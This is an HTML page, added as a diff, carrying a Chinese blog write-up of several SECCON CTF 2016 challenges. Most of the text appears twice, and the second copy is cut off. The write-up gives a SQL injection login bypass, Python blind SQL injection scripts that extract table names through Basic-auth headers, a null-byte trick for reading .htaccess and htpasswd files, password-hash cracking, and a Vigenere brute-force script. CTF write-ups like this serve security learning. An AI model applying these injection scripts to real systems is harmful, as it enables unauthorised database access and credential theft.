@@ -1,0 +1,680 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
+<title>Bendawang's Site</title>
+<link href="./Seccon-CTF-2016-部分Writeup/font-awesome.min.css" rel="stylesheet"/>
+<link href="./Seccon-CTF-2016-部分Writeup/screen.css" rel="stylesheet"/>
+<link href="./Seccon-CTF-2016-部分Writeup/prism_okaidia.css" rel="stylesheet"/>
+<link href="./Seccon-CTF-2016-部分Writeup/bendawang.css" rel="stylesheet"/>
+<script src="./Seccon-CTF-2016-部分Writeup/jquery.min.js"></script>
+</head>
+<body class="wrap">
+<header>
+<nav class="mobile-nav show-on-mobiles">
+<ul>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+<div class="show-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img src="./Seccon-CTF-2016-部分Writeup/bendawang.png" style="display:block;width:100%;"/></a>
+</h1>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit test2 hide-on-mobiles">
+<h1>
+<a href="/">
+<span>Bendawang</span>
+<img alt="" height="115" src="./Seccon-CTF-2016-部分Writeup/bendawang.png" width="449"/></a>
+</h1>
+</div>
+<nav class="main-nav unit test1 hide-on-mobiles">
+<ul>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li></li><li></li><li></li><li></li><li></li>
+<li class="">
+<a href="/index">归档</a></li>
+<li class="">
+<a href="/time">时间</a></li>
+<!--<li class="">
+            <a href="/category">标签</a></li>-->
+<li class="">
+<a href="/friendlink">友链</a></li>
+<li class="">
+<a href="/about">about</a></li>
+</ul>
+</nav>
+</div>
+</header>
+<script>
+$('document').ready(function(){
+    $('li[class]:eq(4)').attr('class','current');
+});
+</script>
+<section class="docs">
+<div class="grid">
+<!--移动端-->
+<div class="show-on-mobiles">
+<div class="article-info profile-block">
+<div class="article-info-block">
+               55
+               <span>文章</span>
+</div>
+<div class="article-info-block">
+               5
+               <span>标签</span>
+</div>
+</div>
+<div class="profile-block social-links">
+<table>
+<tbody><tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i></a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i></a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i></a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody></table>
+</div>
+<div class="whole show-on-mobiles">
+<article class="bdw_article">
+<div class="Bendawang" id="Bendawang_mobile">
+<b id="Bendawang_toggle_mobile" title="收起">目录[+]</b></div></article></div></div></div></section></body></html>
+<div class="Bendawang_content" id="Bendawang_content_mobile"></div>
+
+<br/>
+<br/>
+<h1 id="secconctf2016writeup">Seccon-CTF-2016-部分Writeup</h1>
+<p style="max-width:100%;height:auto;">做了国外的题才发现差的有多远。。。还是太菜了。。。</p>
+<h2 id="web100basiq">web100 basiq</h2>
+<p style="max-width:100%;height:auto;">看了看源码请求什么的，发现这道题是通过js请求CGI拿数据，没有什么大问题，然后看看js，有个<code style="max-width:100%;height:auto;">client.js</code>，跟进看看login啊之类的函数</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">function login(message){
+    if(message.status!==&amp;apos;OK&amp;apos;){
+        alert(message.error);
+        return;
+    }
+    loginuser = message.data;
+    $.getJSON(&amp;apos;keiba.cgi?action=expenditure&amp;apos;, expenditure);
+    var links = [{label:&amp;apos;Race Information&amp;apos;,href:&amp;apos;/&amp;apos;},{label:&amp;apos;My Page&amp;apos;,href:&amp;apos;/mypage.cgi&amp;apos;}];
+    if(loginuser == &amp;apos;admin&amp;apos;){
+        links.push({label:&amp;apos;Admin&amp;apos;, href:&amp;apos;/admin/&amp;apos;});
+    }
+    $(&amp;apos;div.login&amp;apos;).text(&amp;apos;[ &amp;apos;);
+    for(var i=0; i&lt;links.length; i++){
+        if(i&gt;0){
+            $(&amp;apos;div.login&amp;apos;).append(document.createTextNode(&amp;apos; | &amp;apos;))
+        }
+        $(&amp;apos;div.login&amp;apos;)
+            .append($(&amp;apos;&lt;a&gt;&amp;apos;)
+                .attr(&amp;apos;href&amp;apos;,links[i].href)
+                .text(links[i].label));
+    }
+    $(&amp;apos;div.login&amp;apos;).append(document.createTextNode(&amp;apos; ] &amp;apos;));
+..................
+..................
+..................
+</code></pre>
+<p style="max-width:100%;height:auto;">发现了一个<code style="max-width:100%;height:auto;">admin</code>页面，访问下，发现需要用户名和密码，也就是说这里是唯一一处不通过CGI的地方，那么便猜想是不是这里存在注入。
+输入用户名<code style="max-width:100%;height:auto;">admin</code>，密码<code style="max-width:100%;height:auto;">1&amp;apos; or 1=1 -- a</code>。
+果然成功登陆进去了，抓个包看看是个BASIC认证，那么就可以写脚本爆破了。
+然后我先写了个脚本如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">import requests
+import base64
+
+url="http://basiq.pwn.seccon.jp/admin/"
+r=requests.session()
+ans=""
+header={
+&amp;apos;Host&amp;apos;: &amp;apos;basiq.pwn.seccon.jp&amp;apos;,
+&amp;apos;User-Agent&amp;apos;: &amp;apos;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0&amp;apos;,
+&amp;apos;Accept&amp;apos;: &amp;apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&amp;apos;,
+&amp;apos;Accept-Language&amp;apos;: &amp;apos;zh,en-US;q=0.7,en;q=0.3&amp;apos;,
+&amp;apos;Accept-Encoding&amp;apos;: &amp;apos;gzip, deflate&amp;apos;,
+&amp;apos;Connection&amp;apos;: &amp;apos;keep-alive&amp;apos;,
+&amp;apos;Cache-Control&amp;apos;: &amp;apos;max-age=0&amp;apos;,
+}
+
+for i in xrange(1,100):
+    start=33
+    end=127
+    while start&lt;end:
+        if end-start==1:
+            param="admin:1&amp;apos; or if(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),{location},1))&lt;={char},1,0)-- ".format(location=str(i),char=chr(start))
+            header[&amp;apos;Authorization&amp;apos;]=&amp;apos;Basic &amp;apos;+base64.b64encode(param)
+            content=r.get(url,headers=header).content
+            if &amp;apos;401 Unauthorized&amp;apos; in content:
+                start=end
+            else:
+                end=start
+        else:
+            mid=(start+end)/2
+            param="admin:1&amp;apos; or if(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),{location},1))&lt;={char},1,0)-- ".format(location=str(i),char=mid)
+            header[&amp;apos;Authorization&amp;apos;]=&amp;apos;Basic &amp;apos;+base64.b64encode(param)
+            #print header
+            content=r.get(url,headers=header).content
+            if &amp;apos;401 Unauthorized&amp;apos; in content:
+                start=mid
+            else:
+                end=mid
+    ans+=chr(start)
+    print ans.encode(&amp;apos;hex&amp;apos;)
+</code></pre>
+<p style="max-width:100%;height:auto;">跑的时候先打了三个空行，然后直接逗号
+<br/><img alt="这里写图片描述" data-action="zoom" src="./Seccon-CTF-2016-部分Writeup/SouthEast" style="max-width:100%;height:auto;"/><br/>
+那么很显然我的区间[33,127]是错的，有表名在范围外的，但是改成[0,127]之后还是不行。
+结果还是一样的</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Seccon-CTF-2016-部分Writeup/SouthEast" style="max-width:100%;height:auto;"/><br/>
+而且后面这些表我都爆了一遍也没啥东西。
+那么就是第一个没有炸出来的表了。
+也就是说很可能用了中文字符，或是别的编码的字符，至少占用了2字节以上的字符了。
+这就稍稍麻烦了，需要转换下payload，把直接的字符串形式的表名先<code style="max-width:100%;height:auto;">hex</code>一下在<code style="max-width:100%;height:auto;">substring</code>截取来爆破。
+即爆破它的16进制字符串就好啦，然后
+爆破表名的poc如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">import requests
+import base64
+url="http://basiq.pwn.seccon.jp/admin/"
+r=requests.session()
+ans=""
+header={
+&amp;apos;Host&amp;apos;: &amp;apos;basiq.pwn.seccon.jp&amp;apos;,
+&amp;apos;User-Agent&amp;apos;: &amp;apos;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0&amp;apos;,
+&amp;apos;Accept&amp;apos;: &amp;apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&amp;apos;,
+&amp;apos;Accept-Language&amp;apos;: &amp;apos;zh,en-US;q=0.7,en;q=0.3&amp;apos;,
+&amp;apos;Accept-Encoding&amp;apos;: &amp;apos;gzip, deflate&amp;apos;,
+&amp;apos;Connection&amp;apos;: &amp;apos;keep-alive&amp;apos;,
+&amp;apos;Cache-Control&amp;apos;: &amp;apos;max-age=0&amp;apos;,
+}
+for i in xrange(1,100):
+    start=33
+    end=127
+    while start&lt;end:
+        if end-start==1:
+            param="admin:1&amp;apos; or if(ascii(substring((select hex(group_concat(table_name)) from information_schema.tables where table_schema=database()),{location},1))&lt;={char},1,0)-- ".format(location=str(i),char=chr(start))
+            header[&amp;apos;Authorization&amp;apos;]=&amp;apos;Basic &amp;apos;+base64.b64encode(param)
+            content=r.get(url,headers=header).content
+            if &amp;apos;401 Unauthorized&amp;apos; in content:
+                start=end
+            else:
+                end=start
+        else:
+            mid=(start+end)/2
+            param="admin:1&amp;apos; or if(ascii(substring((select hex(group_concat(table_name)) from information_schema.tables where table_schema=database()),{location},1))&lt;={char},1,0)-- ".format(location=str(i),char=mid)
+            header[&amp;apos;Authorization&amp;apos;]=&amp;apos;Basic &amp;apos;+base64.b64encode(param)
+            #print header
+            content=r.get(url,headers=header).content
+            if &amp;apos;401 Unauthorized&amp;apos; in content:
+                start=mid
+            else:
+                end=mid
+    ans+=chr(start)
+    print ans
+</code></pre>
+<p style="max-width:100%;height:auto;">截图如下，只看第一个表。
+<br/><img alt="这里写图片描述" data-action="zoom" src="./Seccon-CTF-2016-部分Writeup/SouthEast" style="max-width:100%;height:auto;"/><br/>
+<code style="max-width:100%;height:auto;">2C</code>是逗号的16进制，
+也就是前面一大堆是第一张表名了。
+接下来正常爆库就行了。
+该表的列有<code style="max-width:100%;height:auto;">id,name,pass</code>
+然后读取内容，需要将刚才的一对16进制编码下，然后表名是<code style="max-width:100%;height:auto;">☹☺☻</code>
+所以最后的flag如下图：
+<br/><img alt="这里写图片描述" data-action="zoom" src="./Seccon-CTF-2016-部分Writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web200pppppoxy">web200 pppppoxy</h2>
+<p style="max-width:100%;height:auto;">看到一个exe。。。秒趟。。先跳为敬</p>
+<h2 id="web300uncomfortableweb">web300 uncomfortable-web</h2>
+<p style="max-width:100%;height:auto;">题目允许上传py,sh,pl脚本，并且执行返回结果。
+直接弹shell的没用。
+那就先规规矩矩的试试。
+上传如下</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl http://127.0.0.1:81/ -v -L
+</code></pre>
+<p style="max-width:100%;height:auto;">发现一个目录<code style="max-width:100%;height:auto;">authed</code>和<code style="max-width:100%;height:auto;">select.cgi</code>
+目录被禁止访问了，
+然后看看cgi，可以传参。
+上传</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl http://127.0.0.1:81/select.cgi?txt=a -v -L
+</code></pre>
+<p style="max-width:100%;height:auto;">发现提示是<code style="max-width:100%;height:auto;">authed/a.txt</code>,
+也就是说这个cgi读取的是authed下的文件，由于服务器是apache，而且一般来说访问不了目录多半是配置<code style="max-width:100%;height:auto;">.htaccess</code>，利用%00截断访问
+<br/><img alt="这里写图片描述" data-action="zoom" src="./Seccon-CTF-2016-部分Writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">果然访问得到要访问<code style="max-width:100%;height:auto;">authed</code>文件夹的用户名是<code style="max-width:100%;height:auto;">keigo</code>，并且得到另一个配置文件<code style="max-width:100%;height:auto;">htpasswd</code>，访问之拿到密码<code style="max-width:100%;height:auto;">LdnoMJCeVy.SE</code>
+然后用<code style="max-width:100%;height:auto;">JohnTheRipper</code>解密如下：
+<br/><img alt="这里写图片描述" data-action="zoom" src="./Seccon-CTF-2016-部分Writeup/SouthEast" style="max-width:100%;height:auto;"/><br/>
+得到密码是test。访问上去。
+看到有个文件夹叫做<code style="max-width:100%;height:auto;">sqlinj</code>，继续跟进访问
+进去后发现有100个cgi文件。
+然后跑一下发现都没有动静，后来看别人的wp，说是72.cgi有sqli，但是我在补题的时候估计提目关了把，没有测成功，据说是接下来就普通联合注入爆库就可以了。</p>
+<h2 id="web300biscuiti">web300 biscuiti</h2>
+<p style="max-width:100%;height:auto;">这道题我单独写了篇blog，以纪念我在这道题上犯的无数的蠢。。。。
+链接：http://blog.csdn.net/qq_19876131/article/details/53674972</p>
+<h2 id="crypto100vigenere">crypto100 vigenere</h2>
+<p style="max-width:100%;height:auto;">题目给了密文和部分明文，还有vigenere映射表。</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">Vigenere
+k: ????????????
+p: SECCON{???????????????????????????????????}
+c: LMIG}RPEDOEEWKJIQIWKJWMNDTSR}TFVUFWYOCBAJBQ
+k=key, p=plain, c=cipher, md5(p)=f528a6ab914c1ecf856a1d93103948fe
+ |ABCDEFGHIJKLMNOPQRSTUVWXYZ{}
+-+----------------------------
+A|ABCDEFGHIJKLMNOPQRSTUVWXYZ{}
+B|BCDEFGHIJKLMNOPQRSTUVWXYZ{}A
+C|CDEFGHIJKLMNOPQRSTUVWXYZ{}AB
+D|DEFGHIJKLMNOPQRSTUVWXYZ{}ABC
+E|EFGHIJKLMNOPQRSTUVWXYZ{}ABCD
+F|FGHIJKLMNOPQRSTUVWXYZ{}ABCDE
+G|GHIJKLMNOPQRSTUVWXYZ{}ABCDEF
+H|HIJKLMNOPQRSTUVWXYZ{}ABCDEFG
+I|IJKLMNOPQRSTUVWXYZ{}ABCDEFGH
+J|JKLMNOPQRSTUVWXYZ{}ABCDEFGHI
+K|KLMNOPQRSTUVWXYZ{}ABCDEFGHIJ
+L|LMNOPQRSTUVWXYZ{}ABCDEFGHIJK
+M|MNOPQRSTUVWXYZ{}ABCDEFGHIJKL
+N|NOPQRSTUVWXYZ{}ABCDEFGHIJKLM
+O|OPQRSTUVWXYZ{}ABCDEFGHIJKLMN
+P|PQRSTUVWXYZ{}ABCDEFGHIJKLMNO
+Q|QRSTUVWXYZ{}ABCDEFGHIJKLMNOP
+R|RSTUVWXYZ{}ABCDEFGHIJKLMNOPQ
+S|STUVWXYZ{}ABCDEFGHIJKLMNOPQR
+T|TUVWXYZ{}ABCDEFGHIJKLMNOPQRS
+U|UVWXYZ{}ABCDEFGHIJKLMNOPQRST
+V|VWXYZ{}ABCDEFGHIJKLMNOPQRSTU
+W|WXYZ{}ABCDEFGHIJKLMNOPQRSTUV
+X|XYZ{}ABCDEFGHIJKLMNOPQRSTUVW
+Y|YZ{}ABCDEFGHIJKLMNOPQRSTUVWX
+Z|Z{}ABCDEFGHIJKLMNOPQRSTUVWXY
+{|{}ABCDEFGHIJKLMNOPQRSTUVWXYZ
+}|}ABCDEFGHIJKLMNOPQRSTUVWXYZ{
+</code></pre>
+<p style="max-width:100%;height:auto;">密钥长度12，由给出的部分明文推出前7位的key为<code style="max-width:100%;height:auto;">VIGENER</code>，也就是还剩五位，然后我们已知明文的hash，就可以通过枚举密钥解密来对比明文hash值。
+但是五位密钥的话，28的五次方大概1700万+，这里我看密钥样子我猜测第八位密钥为<code style="max-width:100%;height:auto;">E</code>，这样就只用枚举60万+。最后脚本如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">import hashlib
+vigenere=&amp;apos;ABCDEFGHIJKLMNOPQRSTUVWXYZ{}&amp;apos;
+key=&amp;apos;VIGENERE&amp;apos;
+len_key=12
+p="SECCON{?????BCDEDEF?????KLMNOPQ?????VWXYYZ}"
+c="LMIG}RPEDOEEWKJIQIWKJWMNDTSR}TFVUFWYOCBAJBQ"
+cnt=0
+def distance(a,b):  #a-b
+    if a&gt;b:
+        return 28-(vigenere.find(a)-vigenere.find(b))
+    else:
+        return (vigenere.find(b)-vigenere.find(a))
+for i1 in vigenere:
+    for j in vigenere:
+        for k in vigenere:
+            for l in vigenere:
+                tmp=key+i1+j+k+l
+                ans=""
+                cnt+=1
+                for i in xrange(len(p)):
+                    ans+=vigenere[distance(tmp[i%12],c[i])]
+                print ans,cnt
+                if hashlib.md5(ans).hexdigest()==&amp;apos;f528a6ab914c1ecf856a1d93103948fe&amp;apos;:
+                    a=raw_input("Success! flag is "+ans)
+</code></pre>
+<p style="max-width:100%;height:auto;">运行截图如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Seccon-CTF-2016-部分Writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+
+
+
+<!--PC端-->
+<div class="unit one-fifth hide-on-mobiles" id="scroll" style="position:absolute;left:30px">
+<div class="inner profile-inner">
+<div class="base-info profile-block">
+<img id="avatar" src="./Seccon-CTF-2016-部分Writeup/logo.jpg"/>
+<h2 id="name" style="text-align:center">Bendawang</h2>
+<span id="location" style="font-size:18px">
+<i class="fa fa-map-marker"></i>SiChuan, China</span>
+<a href="/about" id="follow">联系我</a></div>
+<div class="article-info profile-block">
+<div class="article-info-block">
+        55
+          <span>文章</span></div>
+<div class="article-info-block">
+        5
+          <span>标签</span></div>
+</div>
+<div class="profile-block social-links hide-on-mobiles">
+<table>
+<tbody>
+<tr>
+<td>
+<a href="https://github.com/530393297" target="_blank" title="github">
+<i class="fa fa-github"></i>
+</a>
+</td>
+<td>
+<a href="tencent://message/?uin=1814054026&amp;Site=有事Q我&amp;Menu=yes" target="_blank" title="qq">
+<i class="fa fa-qq"></i>
+</a>
+</td>
+<td>
+<a href="http://weibo.com/2734326455/profile" target="_blank" title="weibo">
+<i class="fa fa-weibo"></i>
+</a>
+</td>
+<td>
+<a href="http://bendawang.site/rss" target="_blank" title="rss">
+<i class="fa fa-rss-square"></i></a>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+</div>
+</div>
+<div class="unit three-quarters hide-on-mobiles">
+<article class="bdw_article">
+<h1 id="secconctf2016writeup">Seccon-CTF-2016-部分Writeup</h1>
+<p style="max-width:100%;height:auto;">做了国外的题才发现差的有多远。。。还是太菜了。。。</p>
+<h2 id="web100basiq">web100 basiq</h2>
+<p style="max-width:100%;height:auto;">看了看源码请求什么的，发现这道题是通过js请求CGI拿数据，没有什么大问题，然后看看js，有个<code style="max-width:100%;height:auto;">client.js</code>，跟进看看login啊之类的函数</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">function login(message){
+    if(message.status!==&amp;apos;OK&amp;apos;){
+        alert(message.error);
+        return;
+    }
+    loginuser = message.data;
+    $.getJSON(&amp;apos;keiba.cgi?action=expenditure&amp;apos;, expenditure);
+    var links = [{label:&amp;apos;Race Information&amp;apos;,href:&amp;apos;/&amp;apos;},{label:&amp;apos;My Page&amp;apos;,href:&amp;apos;/mypage.cgi&amp;apos;}];
+    if(loginuser == &amp;apos;admin&amp;apos;){
+        links.push({label:&amp;apos;Admin&amp;apos;, href:&amp;apos;/admin/&amp;apos;});
+    }
+    $(&amp;apos;div.login&amp;apos;).text(&amp;apos;[ &amp;apos;);
+    for(var i=0; i&lt;links.length; i++){
+        if(i&gt;0){
+            $(&amp;apos;div.login&amp;apos;).append(document.createTextNode(&amp;apos; | &amp;apos;))
+        }
+        $(&amp;apos;div.login&amp;apos;)
+            .append($(&amp;apos;&lt;a&gt;&amp;apos;)
+                .attr(&amp;apos;href&amp;apos;,links[i].href)
+                .text(links[i].label));
+    }
+    $(&amp;apos;div.login&amp;apos;).append(document.createTextNode(&amp;apos; ] &amp;apos;));
+..................
+..................
+..................
+</code></pre>
+<p style="max-width:100%;height:auto;">发现了一个<code style="max-width:100%;height:auto;">admin</code>页面，访问下，发现需要用户名和密码，也就是说这里是唯一一处不通过CGI的地方，那么便猜想是不是这里存在注入。
+输入用户名<code style="max-width:100%;height:auto;">admin</code>，密码<code style="max-width:100%;height:auto;">1&amp;apos; or 1=1 -- a</code>。
+果然成功登陆进去了，抓个包看看是个BASIC认证，那么就可以写脚本爆破了。
+然后我先写了个脚本如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">import requests
+import base64
+
+url="http://basiq.pwn.seccon.jp/admin/"
+r=requests.session()
+ans=""
+header={
+&amp;apos;Host&amp;apos;: &amp;apos;basiq.pwn.seccon.jp&amp;apos;,
+&amp;apos;User-Agent&amp;apos;: &amp;apos;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0&amp;apos;,
+&amp;apos;Accept&amp;apos;: &amp;apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&amp;apos;,
+&amp;apos;Accept-Language&amp;apos;: &amp;apos;zh,en-US;q=0.7,en;q=0.3&amp;apos;,
+&amp;apos;Accept-Encoding&amp;apos;: &amp;apos;gzip, deflate&amp;apos;,
+&amp;apos;Connection&amp;apos;: &amp;apos;keep-alive&amp;apos;,
+&amp;apos;Cache-Control&amp;apos;: &amp;apos;max-age=0&amp;apos;,
+}
+
+for i in xrange(1,100):
+    start=33
+    end=127
+    while start&lt;end:
+        if end-start==1:
+            param="admin:1&amp;apos; or if(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),{location},1))&lt;={char},1,0)-- ".format(location=str(i),char=chr(start))
+            header[&amp;apos;Authorization&amp;apos;]=&amp;apos;Basic &amp;apos;+base64.b64encode(param)
+            content=r.get(url,headers=header).content
+            if &amp;apos;401 Unauthorized&amp;apos; in content:
+                start=end
+            else:
+                end=start
+        else:
+            mid=(start+end)/2
+            param="admin:1&amp;apos; or if(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema=database()),{location},1))&lt;={char},1,0)-- ".format(location=str(i),char=mid)
+            header[&amp;apos;Authorization&amp;apos;]=&amp;apos;Basic &amp;apos;+base64.b64encode(param)
+            #print header
+            content=r.get(url,headers=header).content
+            if &amp;apos;401 Unauthorized&amp;apos; in content:
+                start=mid
+            else:
+                end=mid
+    ans+=chr(start)
+    print ans.encode(&amp;apos;hex&amp;apos;)
+</code></pre>
+<p style="max-width:100%;height:auto;">跑的时候先打了三个空行，然后直接逗号
+<br/><img alt="这里写图片描述" data-action="zoom" src="./Seccon-CTF-2016-部分Writeup/SouthEast" style="max-width:100%;height:auto;"/><br/>
+那么很显然我的区间[33,127]是错的，有表名在范围外的，但是改成[0,127]之后还是不行。
+结果还是一样的</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="这里写图片描述" data-action="zoom" src="./Seccon-CTF-2016-部分Writeup/SouthEast" style="max-width:100%;height:auto;"/><br/>
+而且后面这些表我都爆了一遍也没啥东西。
+那么就是第一个没有炸出来的表了。
+也就是说很可能用了中文字符，或是别的编码的字符，至少占用了2字节以上的字符了。
+这就稍稍麻烦了，需要转换下payload，把直接的字符串形式的表名先<code style="max-width:100%;height:auto;">hex</code>一下在<code style="max-width:100%;height:auto;">substring</code>截取来爆破。
+即爆破它的16进制字符串就好啦，然后
+爆破表名的poc如下：</p>
+<pre><code class="python language-python" style="max-width:100%;height:auto;">import requests
+import base64
+url="http://basiq.pwn.seccon.jp/admin/"
+r=requests.session()
+ans=""
+header={
+&amp;apos;Host&amp;apos;: &amp;apos;basiq.pwn.seccon.jp&amp;apos;,
+&amp;apos;User-Agent&amp;apos;: &amp;apos;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0&amp;apos;,
+&amp;apos;Accept&amp;apos;: &amp;apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&amp;apos;,
+&amp;apos;Accept-Language&amp;apos;: &amp;apos;zh,en-US;q=0.7,en;q=0.3&amp;apos;,
+&amp;apos;Accept-Encoding&amp;apos;: &amp;apos;gzip, deflate&amp;apos;,
+&amp;apos;Connection&amp;apos;: &amp;apos;keep-alive&amp;apos;,
+&amp;apos;Cache-Control&amp;apos;: &amp;apos;max-age=0&amp;apos;,
+}
+for i in xrange(1,100):
+    start=33
+    end=127
+    while start&lt;end:
+        if end-start==1:
+            param="admin:1&amp;apos; or if(ascii(substring((select hex(group_concat(table_name)) from information_schema.tables where table_schema=database()),{location},1))&lt;={char},1,0)-- ".format(location=str(i),char=chr(start))
+            header[&amp;apos;Authorization&amp;apos;]=&amp;apos;Basic &amp;apos;+base64.b64encode(param)
+            content=r.get(url,headers=header).content
+            if &amp;apos;401 Unauthorized&amp;apos; in content:
+                start=end
+            else:
+                end=start
+        else:
+            mid=(start+end)/2
+            param="admin:1&amp;apos; or if(ascii(substring((select hex(group_concat(table_name)) from information_schema.tables where table_schema=database()),{location},1))&lt;={char},1,0)-- ".format(location=str(i),char=mid)
+            header[&amp;apos;Authorization&amp;apos;]=&amp;apos;Basic &amp;apos;+base64.b64encode(param)
+            #print header
+            content=r.get(url,headers=header).content
+            if &amp;apos;401 Unauthorized&amp;apos; in content:
+                start=mid
+            else:
+                end=mid
+    ans+=chr(start)
+    print ans
+</code></pre>
+<p style="max-width:100%;height:auto;">截图如下，只看第一个表。
+<br/><img alt="这里写图片描述" data-action="zoom" src="./Seccon-CTF-2016-部分Writeup/SouthEast" style="max-width:100%;height:auto;"/><br/>
+<code style="max-width:100%;height:auto;">2C</code>是逗号的16进制，
+也就是前面一大堆是第一张表名了。
+接下来正常爆库就行了。
+该表的列有<code style="max-width:100%;height:auto;">id,name,pass</code>
+然后读取内容，需要将刚才的一对16进制编码下，然后表名是<code style="max-width:100%;height:auto;">☹☺☻</code>
+所以最后的flag如下图：
+<br/><img alt="这里写图片描述" data-action="zoom" src="./Seccon-CTF-2016-部分Writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<h2 id="web200pppppoxy">web200 pppppoxy</h2>
+<p style="max-width:100%;height:auto;">看到一个exe。。。秒趟。。先跳为敬</p>
+<h2 id="web300uncomfortableweb">web300 uncomfortable-web</h2>
+<p style="max-width:100%;height:auto;">题目允许上传py,sh,pl脚本，并且执行返回结果。
+直接弹shell的没用。
+那就先规规矩矩的试试。
+上传如下</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl http://127.0.0.1:81/ -v -L
+</code></pre>
+<p style="max-width:100%;height:auto;">发现一个目录<code style="max-width:100%;height:auto;">authed</code>和<code style="max-width:100%;height:auto;">select.cgi</code>
+目录被禁止访问了，
+然后看看cgi，可以传参。
+上传</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">curl http://127.0.0.1:81/select.cgi?txt=a -v -L
+</code></pre>
+<p style="max-width:100%;height:auto;">发现提示是<code style="max-width:100%;height:auto;">authed/a.txt</code>,
+也就是说这个cgi读取的是authed下的文件，由于服务器是apache，而且一般来说访问不了目录多半是配置<code style="max-width:100%;height:auto;">.htaccess</code>，利用%00截断访问
+<br/><img alt="这里写图片描述" data-action="zoom" src="./Seccon-CTF-2016-部分Writeup/SouthEast" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">果然访问得到要访问<code style="max-width:100%;height:auto;">authed</code>文件夹的用户名是<code style="max-width:100%;height:auto;">keigo</code>，并且得到另一个配置文件<code style="max-width:100%;height:auto;">htpasswd</code>，访问之拿到密码<code style="max-width:100%;height:auto;">LdnoMJCeVy.SE</code>
+然后用<code style="max-width:100%;height:auto;">JohnTheRipper</code>解密如下：
+<br/><img alt="这里写图片描述" data-action="zoom" src="./Seccon-CTF-2016-部分Writeup/SouthEast" style="max-width:100%;height:auto;"/><br/>
+得到密码是test。访问上去。
+看到有个文件夹叫做<code style="max-width:100%;height:auto;">sqlinj</code>，继续跟进访问
+进去后发现有100个cgi文件。
+然后跑一下发现都没有动静，后来看别人的wp，说是72.cgi有sqli，但是我在补题的时候估计提目关了把，没有测成功，据说是接下来就普通联合注入爆库就可以了。</p>
+<h2 id="web300biscuiti">web300 biscuiti</h2>
+<p style="max-width:100%;height:auto;">这道题我单独写了篇blog，以纪念我在这道题上犯的无数的蠢。。。。
+链接：http://blog.csdn.net/qq_19876131/article/details/53674972</p>
+<h2 id="crypto100vigenere">crypto100 vigenere</h2>
+<p style="max-width:100%;height:auto;">题目给了密文和部分明文，还有vigenere映射表。</p>
+<pre><code class="bash language-bash" style="max-width:100%;height:auto;">Vigenere
+k: ????????????
+p: SECCON{???????????????????????????????????}
+c: LMIG}RPEDOEEWKJIQIWKJWMNDTSR}TFVUFWYOCBAJBQ
+k=key, p=plain, c=cipher, md5(p)=f528a6ab914c1ecf856a1d93103948fe
+ |ABCDEFGHIJKLMNOPQRSTUVWXYZ{}
+-+----------------------------
+A|ABCDEFGHIJKLMNOPQRSTUVWXYZ{}
+B|BCDEFGHIJKLMNOPQRSTUVWXYZ{}A
+C|CDEFGHIJKLMNOPQRSTUVWXYZ{}AB
+D|DEFGHIJKLMNOPQRSTUVWXYZ{}ABC
